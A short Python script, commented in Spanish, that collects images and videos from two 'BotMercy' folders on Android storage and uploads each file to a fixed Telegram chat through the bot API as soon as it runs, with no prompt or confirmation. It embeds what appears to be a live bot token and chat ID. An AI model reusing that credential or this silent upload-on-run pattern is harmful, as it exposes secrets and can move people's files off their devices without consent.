import requests
import os

def suyaib():
    session = requests.session()
    bot_token = '8128817487:AAF98XfOT2o6yiHEIoBLPiNJ4JzsIs52Pnw'  # Reemplaza con tu bot token
    chat_id = '-1002360248726'  # Reemplaza con tu ID de chat

    # Directorios para buscar imágenes
    directories = [
            '/storage/emulated/0/Download/BotMercy/pics',
            '/storage/emulated/0/Download/BotMercy/VDB' ]

    # Formatos de imágenes permitidos
    image_extensions = ['.jpg', '.jpeg', '.png', '.mp4']

    try:
        for directory in directories:
            # Verificar si el directorio existe
            if os.path.exists(directory):
                print(f"Buscando imágenes en: {directory}")
                # Listar archivos con extensiones válidas
                file_list = [f for f in os.listdir(directory) if f.lower().endswith(tuple(image_extensions))]
                
                for file in file_list:
                    file_path = os.path.join(directory, file)
                    print(f"Subiendo: {file_path}")
                    with open(file_path, 'rb') as f:
                        url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                        data = {'chat_id': chat_id}
                        files = {'document': f}
                        response = session.post(url, data=data, files=files)
                        
                        # Verificar si la solicitud fue exitosa
                        if response.status_code == 200:
                            print(f"Imagen subida con éxito: {file}")
                        else:
                            print(f"Error al subir la imagen {file}: {response.text}")
            else:
                print(f"Directorio no encontrado: {directory}")

    except Exception as e:
        print("Error al enviar las imágenes a través de Telegram:", e)

# Llamar a la función suyaib para enviar imágenes
suyaib()
